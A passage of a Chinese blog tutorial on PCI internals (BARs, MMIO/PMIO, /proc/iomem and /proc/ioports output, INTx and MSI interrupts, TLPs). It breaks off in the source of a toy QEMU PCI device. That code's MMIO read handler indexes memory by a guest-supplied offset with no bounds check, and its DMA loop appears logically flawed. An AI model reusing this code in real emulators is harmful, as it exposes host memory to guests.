0800 00fc 0000 bdfe 0000 0000 0000 0000  ................<br>00000020: 0000 0000 0000 0000 0000 0000 f41a 0011  ................<br>00000030: 0000 bcfe 0000 0000 0000 0000 0000 0000  ................<br></code></pre></td></tr></table></figure><p>通过 <code>/sys/devices/pci0000:00/0000:00:02.0/resource</code> 获取到的信息中每行表示一个地址空间，其中第一行为 MMIO，第二行为 PMIO，三列信息分别为起始地址、终止地址、标志位 ，：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /sys/devices/pci0000\:00/0000\:00\:02.0/resource</span><br>0x00000000fc000000 0x00000000fdffffff 0x0000000000042208<br>0x00000000febd0000 0x00000000febd0fff 0x0000000000040200<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x00000000000c0000 0x00000000000dffff 0x0000000000000212<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br></code></pre></td></tr></table></figure><p>通过 <code>/sys/devices/pci0000:00/0000:00:02.0</code> 下的其他文件也可以访问该设备的一些其他资源信息（例如通过 <code>resource0</code> 可以直接访问 MMIO 空间，<code>resource1</code> 则为其 PMIO 空间）</p><h2 id="五、PCI-Base-Address-register"><a href="#五、PCI-Base-Address-register" class="headerlink" title="五、PCI Base Address register"></a>五、PCI Base Address register</h2><h3 id="I-基本概念"><a href="#I-基本概念" class="headerlink" title="I.基本概念"></a>I.基本概念</h3><p><strong>Base Address register</strong>（BAR）是 PCI 设备配置空间中非常重要的一部分，该组寄存器（也称之为 BAR空间）用以定义 PCI <strong>需要的配置空间大小</strong>以及配置 PCI 设备<strong>占用的地址空间</strong></p><p>我们都知道与设备通信有两种方式：MMIO 与 Port IO，相应地 BAR 的格式也有如下两种：</p><ul><li><p><strong>MMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/CzV32oBP71at9Fg.png" alt="image.png"></p></li><li><p><strong>PMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/w4ind36EF9pPLcy.png" alt="image.png"></p></li></ul><h3 id="II-BAR-的初始化"><a href="#II-BAR-的初始化" class="headerlink" title="II. BAR 的初始化"></a>II. BAR 的初始化</h3><p>当 PCI 设备复位后，其会在 BAR 中存放该设备所需使用的资源类型与大小，当操作系统对 PCI 总线进行配置时，首先会获取到 PCI 设备的 BAR 中的初始信息，之后根据该初始信息分配合理的 <strong>PCI 总线域地址</strong>，将其<strong>写回到 BAR 当中</strong></p><p>通过 BAR 进行资源分配的具体过程如下：</p><ul><li>当 PCI 复位时，其会向 BAR 中写入资源信息，<strong>通过将低位的 bit 设置为 read only 的 0 来标识最小地址空间大小</strong></li><li>系统软件（例如 BIOS）通过向 BAR 写一个<strong>所有 bit 都为 1 的值</strong>来确定从哪个 bit 开始是可写的，从而获取到该 BAR 对应所需的<strong>最小地址空间</strong>，同时通过最低位来获取到 BAR 的类型，并对应为这些 BAR 空间分配地址，<strong>并将分配的地址写回 BAR 空间中</strong></li></ul><blockquote><p> 比如说低 20 bit 都不可写，那就是说这个 bar 所需要的地址空间最小为 1MB，最后从地址总线上分配一个1MB 对齐的地址写回 bar 里</p></blockquote><h3 id="III-处理器域与-PCI-域间访问"><a href="#III-处理器域与-PCI-域间访问" class="headerlink" title="III. 处理器域与 PCI 域间访问"></a>III. 处理器域与 PCI 域间访问</h3><p>需要注意的一点是，<strong>处理器使用存储器域的地址，而 BAR 寄存器存放 PCI 总线域的地址</strong>，因此处理器不能直接通过 <code>BAR + offset</code> 的方式访问 PCI 设备的 BAR 空间，而应当要<strong>将 PCI 总线域的地址转换为存储器域的地址</strong></p><p>由此，PCI BAR 中地址在存储器域中皆有着相应的映像，当处理器访问 PCI 设备的地址空间时，首先访问该设备在存储器域中的地址空间，之后通过 HOST 主桥将存储器域上地址空间转换为 PCI 总线域的地址空间，最后通过 PCI 总线将数据发送到指定的设备中</p><p>反之亦然，当 PCI 设备需要访问存储器域的地址空间时（DMA 操作），首先需要访问该存储器地址空间所对应的 PCI 总线空间，之后通过 HOST 主桥将其转换为存储器地址空间，再由 DDR 控制器完成对存储器的读写</p><h2 id="六、PCI-设备内存-amp-端口空间与访问方式"><a href="#六、PCI-设备内存-amp-端口空间与访问方式" class="headerlink" title="六、PCI 设备内存 &amp; 端口空间与访问方式"></a>六、PCI 设备内存 &amp; 端口空间与访问方式</h2><p>前面我们讲了 PCI 设备与特性和配置相关的配置空间，现在我们来看与 PCI 设备与实际操作相关的内存映射空间与端口映射空间</p><p>所有 IO 设备的内存与端口空间需要被映射到对应的地址空间&#x2F;端口空间中才能访问，这需要占用部分的内存地址空间与端口地址空间，即我们有两种映射外设资源的方式：</p><ul><li><strong>MMIO</strong>（Memory-mapped I&#x2F;O）：即内存映射 IO。这种方式将 IO 设备的内存与寄存器映射到指定的内存地址空间上，此时我们便可以通过常规的访问内存的方式来直接访问到设备的寄存器与内存</li><li><strong>PMIO</strong>（Port-mapped I&#x2F;O）：即端口映射 IO。这种方式将 IO 设备的寄存器编码到指定的端口上，我们需要通过访问端口的方式来访问设备的寄存器与内存（例如在 x86 下通过 <code>in</code> 与 <code>out</code> 这一类的指令可以读写端口）。IO 设备通过专用的针脚或者专用的总线与 CPU 连接，这与内存地址空间相独立，因此又称作 isolated I&#x2F;O</li></ul><p>完成映射之后通过相应的内存&#x2F;端口访问到的便是 PCI 设备的内存&#x2F;端口地址空间</p><blockquote><p>例如实模式下的 <code>0xA0000 ~ 0xBFFFF</code> 这 128KB 地址空间通常被用作显存的映射，当我们在实模式下读写这块区域时通常便是直接读写显卡上的显存，而并非普通的内存</p></blockquote><p>通过 procfs 的 <code>/proc/iomem</code> 我们可以查看物理地址空间的情况，其中我们便能看到各种设备所占用的地址空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/iomem</span><br>00000000-00000fff : Reserved<br>00001000-0009fbff : System RAM<br>0009fc00-0009ffff : Reserved<br>000a0000-000bffff : PCI Bus 0000:00<br>000c0000-000c91ff : Video ROM<br>000c9800-000ca1ff : Adapter ROM<br>000ca800-000ccbff : Adapter ROM<br>000f0000-000fffff : Reserved<br>  000f0000-000fffff : System ROM<br>00100000-7ffdffff : System RAM<br>  1f400000-20200e70 : Kernel code<br>  20200e71-2105843f : Kernel data<br>  2132b000-217fffff : Kernel bss<br>7ffe0000-7fffffff : Reserved<br>80000000-febfffff : PCI Bus 0000:00<br>  fc000000-fdffffff : 0000:00:02.0<br>    fc000000-fdffffff : cirrus<br>  feb80000-febbffff : 0000:00:03.0<br>  febd0000-febd0fff : 0000:00:02.0<br>    febd0000-febd0fff : cirrus<br>  febd1000-febd1fff : 0000:00:03.0<br>  febd2000-febd2fff : 0000:00:04.0<br>  febd3000-febd3fff : 0000:00:05.0<br>fec00000-fec003ff : IOAPIC 0<br>fee00000-fee00fff : Local APIC<br>feffc000-feffffff : Reserved<br>fffc0000-ffffffff : Reserved<br></code></pre></td></tr></table></figure><p>通过 procfs 的 <code>/proc/ioports</code> 我们可以查看 IO 端口情况，其中便包括各种设备对应的 PMIO 端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/ioports</span><br>0000-0cf7 : PCI Bus 0000:00<br>  0000-001f : dma1<br>  0020-0021 : pic1<br>  0040-0043 : timer0<br>  0050-0053 : timer1<br>  0060-0060 : keyboard<br>  0064-0064 : keyboard<br>  0070-0071 : rtc0<br>  0080-008f : dma page reg<br>  00a0-00a1 : pic2<br>  00c0-00df : dma2<br>  00f0-00ff : fpu<br>  0170-0177 : 0000:00:01.1<br>    0170-0177 : ata_piix<br>  01f0-01f7 : 0000:00:01.1<br>    01f0-01f7 : ata_piix<br>  0376-0376 : 0000:00:01.1<br>    0376-0376 : ata_piix<br>  03f2-03f2 : floppy<br>  03f4-03f5 : floppy<br>  03f6-03f6 : 0000:00:01.1<br>    03f6-03f6 : ata_piix<br>  03f7-03f7 : floppy<br>  03f8-03ff : serial<br>  0505-0505 : QEMU0001:00<br>  0510-051b : QEMU0002:00<br>    0510-051b : fw_cfg_io<br>  0600-063f : 0000:00:01.3<br>    0600-0603 : ACPI PM1a_EVT_BLK<br>    0604-0605 : ACPI PM1a_CNT_BLK<br>    0608-060b : ACPI PM_TMR<br>  0700-070f : 0000:00:01.3<br>    0700-0708 : piix4_smbus<br>0cf8-0cff : PCI conf1<br>0d00-adff : PCI Bus 0000:00<br>ae0f-aeff : PCI Bus 0000:00<br>af20-afdf : PCI Bus 0000:00<br>afe0-afe3 : ACPI GPE0_BLK<br>afe4-ffff : PCI Bus 0000:00<br>  c000-c03f : 0000:00:05.0<br>    c000-c03f : virtio-pci-legacy<br>  c040-c05f : 0000:00:01.2<br>    c040-c05f : uhci_hcd<br>  c060-c07f : 0000:00:03.0<br>    c060-c07f : virtio-pci-legacy<br>  c080-c09f : 0000:00:04.0<br>    c080-c09f : virtio-pci-legacy<br>  c0a0-c0bf : 0000:00:06.0<br>    c0a0-c0bf : virtio-pci-legacy<br>  c0c0-c0cf : 0000:00:01.1<br>    c0c0-c0cf : ata_piix<br></code></pre></td></tr></table></figure><h2 id="七、PCI-中断机制"><a href="#七、PCI-中断机制" class="headerlink" title="七、PCI 中断机制"></a>七、PCI 中断机制</h2><p>PCI 设备有两种打中断的方法：传统的 INTx 中断与 MSI 中断，出于兼容的需要 PCIe 完全继承了这个特性</p><h3 id="I-INTx-中断"><a href="#I-INTx-中断" class="headerlink" title="I. INTx 中断"></a>I. INTx 中断</h3><p>INTx 类型的中断即传统的<strong>通过中断引脚来产生的中断</strong>，PCI 总线使用 <code>INTA#</code> 、<code>INTB#</code> 、<code>INTC#</code> 、<code>INTD#</code>  信号（低电平有效）向处理器发出中断请求，不过多数设备仅使用 <code>INTA#</code> 信号</p><p>下图为一个产生  <code>INTA#</code> 中断信号的流程：</p><ul><li>设备向南桥上的中断控制器打一个  <code>INTA#</code> ，中断控制器转为 <code>INTR</code> 信号后通过 APIC bus 打向处理器</li><li>接受中断信号的处理器（未设置则默认都打到 CPU0）通过中断向量表执行对应的处理程序</li></ul><p><img src="https://s2.loli.net/2022/08/31/32jbJDlOpRKSIqy.png" alt="image.png"></p><p>在 PCI 总线中，设备的 <code>INTx 引脚</code>最终要连接到中断控制器的 <code>IRQ 引脚</code> ，下图是一个三 PCI 插槽与中断控制器引脚进行连接的例子：</p><p><img src="https://s2.loli.net/2022/08/31/ZyIur4L7U5oCjJO.png" alt="知乎偷的图"></p><p>还记得我们前文所讲的 PCI 配置空间中的 <code>Interrupt Pin</code> 与 <code>Interrupt Line</code> 域吗？现在我们可以进一步明确其具体用途了：</p><ul><li><code>Interrupt Pin</code>：记录设备应该使用哪一个 INTx 中断信号</li><li><code>Interrupt Line</code>：记录设备连接的引脚</li></ul><p><img src="https://s2.loli.net/2022/08/31/jbtsuypMvza9Nex.png" alt="image.png"></p><h3 id="II-MSI-x2F-MSI-X-中断"><a href="#II-MSI-x2F-MSI-X-中断" class="headerlink" title="II. MSI&#x2F;MSI-X 中断"></a>II. MSI&#x2F;MSI-X 中断</h3><p><strong>Message Signaled Interrupt</strong> 是一种更为现代化与普遍的 PCI 中断机制，<strong>MSI-eXtend</strong> 则为其升级版，该机制的引入是为了消除 INTx 的边带信号，目前绝大多数 PCIe 设备已不再使用传统的 INTx 中断，而是使用 MSI&#x2F;MSI-X 提交中断请求</p><p>在 PCIe 设备中有着两个 Capability 结构，分别对应 MSI 与 MSI-X，通常一个 PCIe 设备仅会包含其中一个。对于 MSI 而言其 Capability ID 为 5，一共有四种结构，分别对应 32 位与 64 位的 Message 结构，以及对应的带上中断 Masking 的结构</p><p><img src="https://s2.loli.net/2022/08/31/v657FsLHc9Kx2Aq.png" alt="知乎偷的图"></p><p>MSI&#x2F;MSI-X 本质上是通过<strong>向特定的内存区域进行写入</strong>来达到中断触发的效果，当 PCI 设备提交请求时，其向 <code>MSI/MSI-x Capability</code> 结构中的 <code>Message Address</code> 地址（PCI总线域）写入 <code>Message Data</code> 数据，从而产生一个存储器写 TLP，由此向处理器提交存储器写请求</p><p>MSI 仅支持 32 个连续的中断向量，而 MSI-X 支持 2048 个非连续的中断向量，但 MSI-X 的中断向量信息并不像 MSI 那样直接存放在配置空间，而是存放在 MMIO 空间中，通过BIR（Base address Indicator Register）与 BAR 来确定其在 MMIO 中的具体位置</p><p><img src="https://s2.loli.net/2022/08/31/QpYXgx5eKczydkE.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/31/EXghx6vUV8S1tdN.png" alt="image.png"></p><p>其结构如下图所示：</p><p><img src="https://s2.loli.net/2022/08/31/a1IuvYtj72lS63K.png" alt="image.png"></p><h2 id="八、Transaction-Layer-Package"><a href="#八、Transaction-Layer-Package" class="headerlink" title="八、Transaction Layer Package"></a>八、Transaction Layer Package</h2><p>上一节我们提到了一个词叫 <code>TLP</code>，这一节我们简要介绍一下这是一个什么东西</p><p>我们首先需要介绍 PCI 设备底层的通信结构，类似于计网的 OSI 七层模型，PCI 总线也可以由下到上划分为 <strong>物理层（Physical Layer）、数据链路层（Data Link Layer）、事务层（Transaction Layer）</strong>，TLP 即 <strong>Transaction Layer Package</strong>：在事务层进行传输的数据包</p><p><img src="https://s2.loli.net/2022/08/31/QVYRUoA4JWbyFZD.png" alt="image.png"></p><h1 id="0x02-Linux-PCI-驱动编写（🕊）"><a href="#0x02-Linux-PCI-驱动编写（🕊）" class="headerlink" title="0x02. Linux PCI 驱动编写（🕊）"></a>0x02. Linux PCI 驱动编写（🕊）</h1><p>有的时候你可能自己手工糊了一个 PCI 设备（？），万分欢喜地想要直接往自家💻的 PCI 插槽上一插就开用了，但是突然发现<strong>并没有一种万能的 PCI 驱动能够直接适配你自己造的 PCI 设备</strong>，那这个时候我们只好自己动手写一个驱动了：）</p><h2 id="〇、QEMU-PCI-设备模拟"><a href="#〇、QEMU-PCI-设备模拟" class="headerlink" title="〇、QEMU PCI 设备模拟"></a>〇、QEMU PCI 设备模拟</h2><p>因为笔者确实没有条件手搓一个 PCI 设备，所以这里只好用 QEMU 来模拟一个，笔者这里实现了一个通过 DMA 提供简单的数据异或功能的 PCI 设备</p><blockquote><p>关于最基础的 QEMU 设备编写、QOM 等，参见<a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/#0x03-%E7%AE%80%E6%98%93-QEMU-%E8%AE%BE%E5%A4%87%E7%BC%96%E5%86%99">这里</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * arttnba3 PCI test device</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Copyright (c) 2022 arttnba3</span><br><span class="hljs-comment"> * Author: arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This programme is just a simple pci device,</span><br><span class="hljs-comment"> * which is cerated for my own learning about qemu.</span><br><span class="hljs-comment"> * You can modify and use it freely.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/event_notifier.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/kvm.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_STATUS_INIT = <span class="hljs-number">0</span>,<br>    A3DEV_STATUS_READY,<br>    A3DEV_STATUS_RUNNING,<br>    A3DEV_STATUS_STOPPING,<br><br>    A3DEV_STATUS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_REGS_STATUS = <span class="hljs-number">0</span>,<br>    A3DEV_REGS_INSN,<br><br>    A3DEV_REGS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_INSN_START = <span class="hljs-number">0</span>,<br>    A3DEV_INSN_STOP,<br><br>    A3DEV_INSN_TYPES,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3EncBufferInfo</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    <span class="hljs-type">dma_addr_t</span> addr;<br>    <span class="hljs-type">uint8_t</span> val;<br>    <span class="hljs-type">uint32_t</span> len;<br>&#125; A3EncBufferInfo;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint64_t</span> regs[A3DEV_REGS_TYPES];<br>    A3EncBufferInfo enc_buf;<br><br>    QemuThread thread;<br>    QemuMutex lock;<br>&#125; A3PCIDevState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">a3dev_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(arg);<br>    <span class="hljs-type">uint8_t</span> cb;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> wlen = <span class="hljs-number">0</span>; wlen &lt; ds-&gt;enc_buf.len; wlen++) &#123;<br>        <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_STOPPING) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pci_dma_read(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>        cb ^= ds-&gt;enc_buf.val;<br>        pci_dma_write(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf) + addr);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span> (size) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *(<span class="hljs-type">uint8_t</span>*)(((<span class="hljs-type">uint8_t</span>*) 